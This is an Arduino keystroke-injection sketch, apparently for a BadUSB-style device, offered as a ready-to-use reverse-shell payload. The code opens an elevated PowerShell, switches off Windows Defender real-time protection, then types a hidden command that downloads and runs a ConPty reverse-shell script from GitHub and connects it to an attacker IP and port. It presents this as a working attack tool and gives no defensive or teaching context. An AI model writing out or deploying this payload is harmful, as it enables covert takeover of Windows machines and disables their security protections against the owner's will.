# Reverse-Shell-Payload


```
#include "Keyboard.h"

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();
  payload();
  Keyboard.end();
}

void payload() {
  
  // Wait 500ms
  delay(500);

  // Turn off Real-time protection and start reverse shell
  toggle_defender();

  // execute powershell command to start reverse shell script [don't forget to change IP]
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print("powershell start-process powershell -verb runas");
  delay(300);
  Keyboard.write(KEY_RETURN);
  delay(600);
  Keyboard.print("powershell -w hidden \"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.15 87\"");
  delay(300);
  Keyboard.write(KEY_RETURN);
  delay(200);

  toggle_defender();
}

void toggle_defender() {
  delay(1000);
  Keyboard.write(KEY_LEFT_GUI);
  delay(500);
  Keyboard.print("virus & threat protection");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(1000);
  Keyboard.write(KEY_TAB);
  delay(100);
  Keyboard.write(KEY_TAB);
  delay(100);
  Keyboard.write(KEY_TAB);
  delay(100);
  Keyboard.write(KEY_TAB);
  delay(100);
  Keyboard.write(' ');
  delay(1000);
  Keyboard.write(' ');
  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(1000);
}
```
/* Unused endless loop *``````/
void loop() {}
